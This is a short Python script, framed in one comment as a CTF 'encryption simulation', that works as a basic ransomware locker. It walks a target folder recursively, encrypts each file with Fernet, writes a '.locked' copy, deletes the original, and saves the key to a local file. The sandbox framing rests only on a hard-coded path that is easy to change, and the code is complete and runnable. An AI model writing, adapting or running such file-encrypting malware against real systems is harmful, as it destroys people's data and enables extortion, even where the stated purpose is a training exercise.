import os
from cryptography.fernet import Fernet

# 1. SETUP: In a CTF, we define a "Sandbox" to stay ethical
TARGET_DIR = os.path.expanduser("~/Desktop/Documents_To_Encrypt")
KEY_FILE = "secret.key"

def generate_key():
    """Generates a key and saves it to a file"""
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    """Loads the key from the current directory"""
    return open(KEY_FILE, "rb").read()

def encrypt_files(target_dir, key):
    """Discovers and encrypts files in the target directory"""
    f = Fernet(key)
    
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Read the original data
            with open(file_path, "rb") as original_file:
                original_data = original_file.read()
            
            # Encrypt the data
            encrypted_data = f.encrypt(original_data)
            
            # Write the encrypted data back (adding .locked extension)
            with open(file_path + ".locked", "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            
            # Delete the original file
            os.remove(file_path)
            print(f"[!] Encrypted: {file}")

if __name__ == "__main__":
    if not os.path.exists(TARGET_DIR):
        print(f"[-] Target directory {TARGET_DIR} not found. Create it first!")
    else:
        print("[*] Starting Encryption Simulation...")
        key = generate_key()
        encrypt_files(TARGET_DIR, key)
        print(f"[*] Mission Complete. Key saved to {KEY_FILE}")
